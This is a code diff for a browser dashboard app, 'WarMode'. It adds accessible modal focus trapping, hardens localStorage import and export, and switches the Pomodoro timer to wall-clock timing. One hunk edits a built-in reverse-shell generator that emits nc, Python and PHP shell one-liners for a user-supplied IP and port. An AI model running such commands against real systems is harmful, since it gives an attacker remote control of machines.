@@ -55,6 +55,11 @@ function safeLoadJSON(key, fallback) {
     const raw = localStorage.getItem(key);
     if (!raw) return JSON.parse(JSON.stringify(fallback));
     const parsed = JSON.parse(raw);
+    // A stored "null" (e.g. from an older backup) is never a valid collection
+    // or scalar default — fall back rather than propagating null into the store.
+    if (parsed === null || parsed === undefined) {
+      return JSON.parse(JSON.stringify(fallback));
+    }
     if (Array.isArray(fallback) && !Array.isArray(parsed)) {
       return JSON.parse(JSON.stringify(fallback));
     }
@@ -231,6 +236,107 @@ function throttle(fn, limit) {
     exports["throttle"] = throttle;
   });
 
+  __def("modal", function (module, exports, __req) {
+    "use strict";
+
+/**
+ * Modal Module - Accessible focus management for the app's modal dialogs.
+ *
+ * Responsibilities:
+ *   - remember which element had focus when a modal opened (the trigger), so
+ *     focus can be returned to it on close;
+ *   - trap Tab/Shift+Tab within the open modal so keyboard focus never escapes
+ *     to the background;
+ *   - optionally move focus into the modal for dialogs that don't focus their
+ *     own first field.
+ *
+ * The show/hide toggle (.show class) is owned by each module; this module only
+ * wraps focus behaviour, so it can be layered onto the existing open/close
+ * functions without changing their DOM logic.
+ */
+
+const FOCUSABLE =
+  'a[href], button:not([disabled]), input:not([disabled]), ' +
+  'textarea:not([disabled]), select:not([disabled]), [tabindex]:not([tabindex="-1"])';
+
+const lastFocused = new Map();
+
+function isVisible(el) {
+  return !!(el.offsetWidth || el.offsetHeight || el.getClientRects().length);
+}
+
+function focusableEls(modal) {
+  return Array.from(modal.querySelectorAll(FOCUSABLE)).filter(isVisible);
+}
+
+function trapKeydown(e) {
+  if (e.key !== 'Tab') return;
+  const modal = e.currentTarget;
+  const els = focusableEls(modal);
+  if (els.length === 0) {
+    e.preventDefault();
+    if (typeof modal.focus === 'function') modal.focus({ preventScroll: true });
+    return;
+  }
+  const first = els[0];
+  const last = els[els.length - 1];
+  if (e.shiftKey) {
+    if (document.activeElement === first) {
+      e.preventDefault();
+      last.focus({ preventScroll: true });
+    }
+  } else {
+    if (document.activeElement === last) {
+      e.preventDefault();
+      first.focus({ preventScroll: true });
+    }
+  }
+}
+
+/**
+ * Prepare a modal for opening: remember the trigger and attach the Tab trap.
+ * Call BEFORE moving focus into the modal so the trigger is captured.
+ */
+function prepareModal(modalId) {
+  const modal = document.getElementById(modalId);
+  if (!modal) return;
+  lastFocused.set(modalId, document.activeElement);
+  modal.addEventListener('keydown', trapKeydown);
+}
+
+/**
+ * Restore focus to the trigger and remove the Tab trap. Call when a modal
+ * closes (from any path: close button, Escape, backdrop click).
+ */
+function restoreModal(modalId) {
+  const modal = document.getElementById(modalId);
+  if (modal) modal.removeEventListener('keydown', trapKeydown);
+  const prev = lastFocused.get(modalId);
+  lastFocused.delete(modalId);
+  if (prev && typeof prev.focus === 'function' && document.contains(prev)) {
+    prev.focus({ preventScroll: true });
+  }
+}
+
+/** Move focus to the first focusable element inside a modal (for dialogs that
+ *  don't focus their own field, e.g. the shortcuts cheat-sheet). */
+function focusFirst(modalId) {
+  const modal = document.getElementById(modalId);
+  if (!modal) return;
+  const first = focusableEls(modal)[0];
+  if (first) {
+    first.focus({ preventScroll: true });
+  } else {
+    modal.setAttribute('tabindex', '-1');
+    modal.focus({ preventScroll: true });
+  }
+}
+
+    exports["prepareModal"] = prepareModal;
+    exports["restoreModal"] = restoreModal;
+    exports["focusFirst"] = focusFirst;
+  });
+
   __def("storage", function (module, exports, __req) {
     "use strict";
     var core = __req("core");
@@ -383,16 +489,24 @@ class Store {
   exportAll() {
     const payload = {};
     Object.entries(STORAGE_KEYS).forEach(([key, storageKey]) => {
-      payload[storageKey] = localStorage.getItem(storageKey);
+      // Only persist keys that actually exist. Exporting null (a key that was
+      // never written) would, on restore, store the string "null" and corrupt
+      // the round-trip for object/array collections.
+      const value = localStorage.getItem(storageKey);
+      if (value !== null) payload[storageKey] = value;
     });
     return payload;
   }
 
   importAll(data) {
     Object.entries(data).forEach(([storageKey, value]) => {
-      if (storageKey.startsWith('warmode_')) {
-        localStorage.setItem(storageKey, value);
-      }
+      // Ignore anything that is not a WarMode key, and refuse null/undefined
+      // (and the literal string "null") so a bad export can never write a
+      // corrupt sentinel that would crash collectors on load.
+      if (!storageKey.startsWith('warmode_')) return;
+      if (value === null || value === undefined) return;
+      if (value === 'null') return;
+      localStorage.setItem(storageKey, value);
     });
     this.loadAll();
     Object.keys(this.data).forEach(key => this.notify(key, this.data[key]));
@@ -497,20 +611,38 @@ function getActiveCheatKey() {
 
   __def("shortcuts", function (module, exports, __req) {
     "use strict";
+    var modal = __req("modal");
+    var prepareModal = modal.prepareModal;
+    var restoreModal = modal.restoreModal;
+    var focusFirst = modal.focusFirst;
 
 /**
  * Shortcuts Module - Keyboard shortcuts modal
  */
 
+
+
 function toggleShortcutsModal() {
   const modal = document.getElementById('shortcuts-modal');
-  if (modal) modal.classList.toggle('show');
+  if (!modal) return;
+  if (modal.classList.contains('show')) {
+    modal.classList.remove('show');
+    restoreModal('shortcuts-modal');
+  } else {
+    prepareModal('shortcuts-modal');
+    modal.classList.add('show');
+    focusFirst('shortcuts-modal');
+  }
 }
 
 function closeShortcutsModal() {
   const modal = document.getElementById('shortcuts-modal');
-  if (modal) modal.classList.remove('show');
+  if (modal) {
+    modal.classList.remove('show');
+    restoreModal('shortcuts-modal');
+  }
 }
+
     exports["toggleShortcutsModal"] = toggleShortcutsModal;
     exports["closeShortcutsModal"] = closeShortcutsModal;
   });
@@ -633,14 +765,9 @@ function toggleBreathing() {
     setAnchor(anchor, phase.label, phase.scale);
   }, PHASE_MS);
 
-  showToast('Box Breathing Started (4-4-4-4 · 60s)');
-}
-
-function stopBreathingGuide() {
-  stopBreathing(document.getElementById('breathe-anchor'), false);
+  showToast('Box Breathing Started (4-4-4-4 · 64s)');
 }
     exports["toggleBreathing"] = toggleBreathing;
-    exports["stopBreathingGuide"] = stopBreathingGuide;
   });
 
   __def("hero", function (module, exports, __req) {
@@ -900,19 +1027,9 @@ function updateAudioBadge() {
   badge.setAttribute('aria-pressed', String(audioModeIndex !== 0));
 }
 
-function stopAudio() {
-  stopFocusAudio();
-}
-
-function getAudioModeIndex() {
-  return audioModeIndex;
-}
-
     exports["initAudio"] = initAudio;
     exports["startFocusAudio"] = startFocusAudio;
     exports["cycleAudio"] = cycleAudio;
-    exports["stopAudio"] = stopAudio;
-    exports["getAudioModeIndex"] = getAudioModeIndex;
     exports["AUDIO_MODES"] = AUDIO_MODES;
   });
 
@@ -1234,11 +1351,6 @@ function toggleScratchpad() {
   else openScratchpad();
 }
 
-function isScratchpadOpen() {
-  const wrap = document.getElementById('scratchpad-wrap');
-  return !!wrap && wrap.classList.contains('show');
-}
-
 function downloadScratchpad() {
   const sp = document.getElementById('scratchpad');
   if (!sp || !sp.value.trim()) {
@@ -1290,7 +1402,6 @@ function renderPomoChart() {
     exports["openScratchpad"] = openScratchpad;
     exports["closeScratchpad"] = closeScratchpad;
     exports["toggleScratchpad"] = toggleScratchpad;
-    exports["isScratchpadOpen"] = isScratchpadOpen;
     exports["downloadScratchpad"] = downloadScratchpad;
     exports["renderPomoChart"] = renderPomoChart;
     exports["exportAllData"] = exportAllData;
@@ -1708,10 +1819,14 @@ function initWidgetEvents() {
     var showToast = core.showToast;
     var createElement = core.createElement;
     var normalizeUrl = core.normalizeUrl;
+    var modal = __req("modal");
+    var prepareModal = modal.prepareModal;
+    var restoreModal = modal.restoreModal;
 
 /**
  * Dock Module - Dynamic dock with add/edit/delete/drag
  */
+
 
 
 
@@ -1848,12 +1963,15 @@ function openDockModal(editIdx = null) {
     colorInput.value = '';
     if (titleEl) titleEl.textContent = 'ADD DOCK APP';
   }
+  prepareModal('dock-modal');
   document.getElementById('dock-modal').classList.add('show');
   nameInput.focus();
 }
 
 function closeDockModal() {
-  document.getElementById('dock-modal').classList.remove('show');
+  const modal = document.getElementById('dock-modal');
+  if (modal) modal.classList.remove('show');
+  restoreModal('dock-modal');
 }
 
 function saveDockSite() {
@@ -1907,10 +2025,14 @@ function saveDockSite() {
     var showToast = core.showToast;
     var createElement = core.createElement;
     var normalizeUrl = core.normalizeUrl;
+    var modal = __req("modal");
+    var prepareModal = modal.prepareModal;
+    var restoreModal = modal.restoreModal;
 
 /**
  * Bookmarks Module - 4 sections with add/edit/delete/drag
  */
+
 
 
 
@@ -2089,12 +2211,15 @@ function openSiteModal(colIndex, linkIndex = null) {
     urlInput.value = '';
     if (titleEl) titleEl.textContent = 'ADD NEW TARGET_NODE';
   }
+  prepareModal('site-modal');
   document.getElementById('site-modal').classList.add('show');
   nameInput.focus();
 }
 
 function closeSiteModal() {
-  document.getElementById('site-modal').classList.remove('show');
+  const modal = document.getElementById('site-modal');
+  if (modal) modal.classList.remove('show');
+  restoreModal('site-modal');
 }
 
 function saveNewSite() {
@@ -2153,10 +2278,14 @@ function saveNewSite() {
     var overlay = __req("overlay");
     var closeCheatOverlay = overlay.closeCheatOverlay;
     var closeOmniSuggestions = overlay.closeOmniSuggestions;
+    var modal = __req("modal");
+    var prepareModal = modal.prepareModal;
+    var restoreModal = modal.restoreModal;
 
 /**
  * Gmail Module - Dynamic email accounts
  */
+
 
 
 
@@ -2264,6 +2393,7 @@ function openGmailModal(editIdx = null) {
     urlInput.value = '';
     if (titleEl) titleEl.textContent = 'ADD EMAIL ACCOUNT';
   }
+  prepareModal('gmail-modal');
   document.getElementById('gmail-modal').classList.add('show');
   nameInput.focus();
 }
@@ -2271,6 +2401,7 @@ function openGmailModal(editIdx = null) {
 function closeGmailModal() {
   const modal = document.getElementById('gmail-modal');
   if (modal) modal.classList.remove('show');
+  restoreModal('gmail-modal');
 }
 
 function saveGmailAccount() {
@@ -2374,10 +2505,14 @@ function toggleGmailMenu(e) {
     var getActiveCheatKey = overlay.getActiveCheatKey;
     var search = __req("search");
     var handleSearch = search.handleSearch;
+    var modal = __req("modal");
+    var prepareModal = modal.prepareModal;
+    var restoreModal = modal.restoreModal;
 
 /**
  * Tools Module - Cheat sheets and quick tools
  */
+
 
 
 
@@ -2566,12 +2701,15 @@ function openToolModal(editIdx = null, forceCheatKey = null) {
     contentInput.value = '';
   }
 
+  prepareModal('tool-modal');
   modal.classList.add('show');
   lblInput.focus();
 }
 
 function closeToolModal() {
-  document.getElementById('tool-modal').classList.remove('show');
+  const modal = document.getElementById('tool-modal');
+  if (modal) modal.classList.remove('show');
+  restoreModal('tool-modal');
 }
 
 function saveCustomTool() {
@@ -2680,7 +2818,15 @@ function editCurrentCheatSheet() {
     var renderPomoChart = scratchpad.renderPomoChart;
 
 /**
- * Timer Module - Clock, Pomodoro, Day Progress
+ * Timer Module - Pomodoro, Day Progress
+ *
+ * Timing strategy: the Pomodoro is driven by WALL-CLOCK time, not by
+ * decrementing a counter once per second. Browsers throttle background-tab
+ * timers (sometimes to ~1/minute), which would make a decrement-based timer
+ * run long. By recording the start instant and computing the remaining time
+ * from Date.now() on every tick, the countdown stays accurate regardless of
+ * throttling. The visible clock in index.html reads getPomodoroState() and
+ * renders the same computed value, so it stays correct even between ticks.
  */
 
 
@@ -2688,11 +2834,11 @@ function editCurrentCheatSheet() {
 
 let isPomodoroActive = false;
 let pomodoroTimer = null;
-let pomodoroSeconds = 25 * 60;
-let clockLoopStarted = false;
+let pomodoroDurationMs = 25 * 60 * 1000;
+let pomodoroStartMs = 0;
+let activePomodoroLabel = "POMODORO";
 
 function initTimer() {
-  dateTime();
   updateDay();
   setInterval(updateDay, 60000);
   resetStatus();
@@ -2715,17 +2861,6 @@ function playCompletionChime() {
       osc.stop(ctx.currentTime + idx * 0.18 + 1.15);
     });
   } catch (e) {}
-}
-
-function dateTime() {
-  const clockElem = document.getElementById('clock-display');
-  if (clockElem && !isPomodoroActive) {
-    clockElem.innerText = new Date().toLocaleTimeString();
-  }
-  if (!clockLoopStarted) {
-    clockLoopStarted = true;
-    setInterval(dateTime, 1000);
-  }
 }
 
 function resetStatus() {
@@ -2755,13 +2890,40 @@ function bumpPomo() {
   localStorage.setItem('warmode_pomo_' + dayKey(new Date()), getPomoCount() + 1);
 }
 
-function startCustomPomodoro(minutes = 25, label = "POMODORO") {
+/** Remaining whole seconds, derived from wall-clock time. */
+function remainingSeconds() {
+  if (!isPomodoroActive) return 0;
+  const elapsed = Date.now() - pomodoroStartMs;
+  return Math.max(0, Math.round((pomodoroDurationMs - elapsed) / 1000));
+}
+
+function formatClock(totalSeconds) {
+  const mins = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
+  const secs = (totalSeconds % 60).toString().padStart(2, '0');
+  return `⏱ ${mins}:${secs}`;
+}
+
+function finishPomodoro() {
   clearInterval(pomodoroTimer);
+  pomodoroTimer = null;
+  isPomodoroActive = false;
+  pomodoroStartMs = 0;
+  if (activePomodoroLabel !== "BREAK") bumpPomo();
+  playCompletionChime();
+  resetStatus();
+  showToast(activePomodoroLabel === "BREAK"
+    ? "Break complete! Ready for WarMode."
+    : "🍅 Focus session complete! Take a 5m break.");
+}
+
+function startCustomPomodoro(minutes = 25, label = "POMODORO") {
+  if (isPomodoroActive) clearInterval(pomodoroTimer);
   isPomodoroActive = true;
-  pomodoroSeconds = Math.max(1, Math.round(minutes * 60));
+  activePomodoroLabel = label;
+  pomodoroDurationMs = Math.max(1000, Math.round(minutes * 60 * 1000));
+  pomodoroStartMs = Date.now();
 
   const sysStatus = document.getElementById('sys-status');
-  const clockElem = document.getElementById('clock-display');
   if (sysStatus) {
     sysStatus.innerText = `[${label}: ${minutes}m]`;
     sysStatus.hidden = false;
@@ -2769,29 +2931,15 @@ function startCustomPomodoro(minutes = 25, label = "POMODORO") {
   }
 
   const tick = () => {
-    const mins = Math.floor(pomodoroSeconds / 60).toString().padStart(2, '0');
-    const secs = (pomodoroSeconds % 60).toString().padStart(2, '0');
-    if (clockElem) clockElem.innerText = `⏱ ${mins}:${secs}`;
-    document.title = `⏱ ${mins}:${secs} · WarMode`;
+    const remaining = remainingSeconds();
+    document.title = formatClock(remaining) + ' · WarMode';
+    if (remaining <= 0) {
+      finishPomodoro();
+    }
   };
 
   tick();
-  pomodoroTimer = setInterval(() => {
-    pomodoroSeconds--;
-    if (pomodoroSeconds <= 0) {
-      pomodoroSeconds = 0;
-      clearInterval(pomodoroTimer);
-      pomodoroTimer = null;
-      isPomodoroActive = false;
-      if (label !== "BREAK") bumpPomo();
-      playCompletionChime();
-      resetStatus();
-      dateTime();
-      showToast(label === "BREAK" ? "Break complete! Ready for WarMode." : "🍅 Focus session complete! Take a 5m break.");
-      return;
-    }
-    tick();
-  }, 1000);
+  pomodoroTimer = setInterval(tick, 1000);
 }
 
 function togglePomodoro() {
@@ -2802,8 +2950,8 @@ function togglePomodoro() {
     clearInterval(pomodoroTimer);
     pomodoroTimer = null;
     isPomodoroActive = false;
+    pomodoroStartMs = 0;
     resetStatus();
-    dateTime();
     showToast("Timer Stopped");
   }
 }
@@ -2818,8 +2966,9 @@ function updateDay() {
 
 
 function getPomodoroState() {
-  return { isPomodoroActive, pomodoroTimer, pomodoroSeconds };
+  return { isPomodoroActive, pomodoroTimer, pomodoroSeconds: remainingSeconds() };
 }
+
     exports["initTimer"] = initTimer;
     exports["resetStatus"] = resetStatus;
     exports["startCustomPomodoro"] = startCustomPomodoro;
@@ -3357,7 +3506,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${safeIp} ${safePort} >/tmp/f
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${safeIp}",${safePort}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
 [PHP exec]
-php -r '\\$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
+php -r '$sock=fsockopen("${safeIp}",${safePort});exec("sh <&3 >&3 2>&3");'`;
 }
 
 function toHex(buffer) {
@@ -3383,6 +3532,9 @@ async function computeHashes(text) {
     exports["initSearch"] = initSearch;
     exports["closeOmniSuggestions"] = closeOmniSuggestions;
     exports["handleSearch"] = handleSearch;
+    exports["evaluateExpression"] = evaluateExpression;
+    exports["calculateCidr"] = calculateCidr;
+    exports["generateRevShells"] = generateRevShells;
   });
 
   __def("edit", function (module, exports, __req) {
@@ -3767,7 +3919,7 @@ const GLOBAL_HANDLERS = {
   // Toasts + reset
   showToast, restoreDefaultSites,
   // Appearance
-  cycleTheme, toggleDarkMode,
+  toggleDarkMode,
 };
 
 Object.entries(GLOBAL_HANDLERS).forEach(([name, fn]) => {
